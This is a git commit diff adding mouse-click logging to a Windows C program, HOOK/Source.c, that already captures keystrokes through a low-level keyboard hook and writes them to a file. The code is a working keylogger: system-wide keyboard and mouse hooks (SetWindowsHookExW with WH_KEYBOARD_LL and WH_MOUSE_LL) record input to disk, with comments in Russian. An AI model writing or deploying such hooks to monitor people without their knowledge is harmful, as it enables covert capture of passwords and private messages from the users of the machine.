d3e890a134963768233d70f4d18ee79bc6fab81d
21nastya.chernaya19@gmail.com <21nastya.chernaya19@gmail.com>
2022-12-14 16:02:16 +0300

    LogMouse

--- HOOK/Source.c
+++ HOOK/Source.c
@@ -6,6 +6,9 @@
 #define ENG 1033
 #define SIZE_STR 20
 
+LRESULT CALLBACK LogMouse(int iCode, WPARAM wParam, LPARAM lParam);
+DWORD LKey = 0, RKey = 0;
+
 BOOL IsCaps(void);
 LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam);
 VOID WriteToFile(LPWSTR wstr);
@@ -14,6 +17,7 @@ WCHAR EnToRus(WCHAR c);
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow)
 {
 	HHOOK hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LogKey, NULL, NULL);
+	HHOOK hHOOK = SetWindowsHookExW(WH_MOUSE_LL, LogMouse, NULL, NULL);
 	MSG msg = { 0 };
 	while (GetMessageW(&msg, NULL, 0, 0))	//функция ожидает системного сообщения
 	{
@@ -21,6 +25,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, 
 		DispatchMessage(&msg);
 	}
 	UnhookWindowsHookEx(hHook);
+	UnhookWindowsHookEx(hHOOK);
 	return 0;
 }
 
@@ -32,7 +37,7 @@ BOOL IsCaps(void)
 	return FALSE;
 }
 
-LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)	//клава
 {
 	if (wParam == WM_KEYDOWN)
 	{
@@ -63,6 +68,33 @@ LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
 			WriteToFile(KeyString);
 		}
 		free(KeyString);
+	}
+	return CallNextHookEx(NULL, iCode, wParam, lParam);
+}
+
+LRESULT CALLBACK LogMouse(int iCode, WPARAM wParam, LPARAM lParam)	//мышка
+{
+	if (wParam == 513)
+	{
+		LKey++;
+		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
+		//LPWSTR KeyString = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
+		swprintf(String, 150, L"Левая кнопка");
+		WriteToFile(L"[");
+		WriteToFile(String);
+		WriteToFile(L"] ");
+		free(String);
+	}
+	if (wParam == 516)
+	{
+		RKey++;
+		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
+		//LPWSTR KeyString = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
+		swprintf(String, 150, L"Правая кнопка");
+		WriteToFile(L"[");
+		WriteToFile(String);
+		WriteToFile(L"] ");
+		free(String);
 	}
 	return CallNextHookEx(NULL, iCode, wParam, lParam);
 }
